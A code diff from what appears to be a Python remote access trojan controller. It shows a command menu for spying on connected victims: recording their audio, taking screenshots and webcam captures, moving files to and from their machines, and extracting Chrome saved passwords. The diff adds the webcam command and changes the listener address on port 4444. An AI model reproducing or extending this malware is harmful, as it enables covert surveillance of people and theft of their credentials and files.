@@ -22,8 +22,9 @@ COMMANDS = {'Commands':['Description'],
             'list':['Lists connected clients'],
             'select':['Selects a client by its index. Takes index as a parameter'],
             'quit':['Stops current connection with a client. To be used when client is selected'],
-            'record <filename_in_which_we_want_save.wav> <time(sec)>':['Records sound of client till amount of time which you specified'],
+            'record <filename.wav> <time(sec)>':['Records sound of client till amount of time which you specified'],
             'screenshot <filename in which we want save>':['Takes a screenshot of client\'s screens'],
+            'webcam <filename.png>':['Take the victim\'s webcam'],
             'upload <file which you want to_upload>':['To upload a file to client.'],
             'download <file which you want to download>':['To download a file from client.'],
             'savedpass <savedpass.txt>':['To extract google chrome saved passwords and save it as the client\'s computer username'],
@@ -55,7 +56,7 @@ def socket_create():
         global host
         global port
         global s
-        host = '192.168.137.1'
+        host = '172.26.48.1'
         port = 4444
         s = socket.socket()
     except socket.error as msg:
@@ -302,6 +303,7 @@ def decrypt_file(conn, filename):
     #         print('File not found on the local machine')
     # except Exception as e:
     #     print('Error occurred while uploading the file:', str(e))
+    #
     try:
         conn.send(str.encode(filename))
         response = conn.recv(1024).decode()
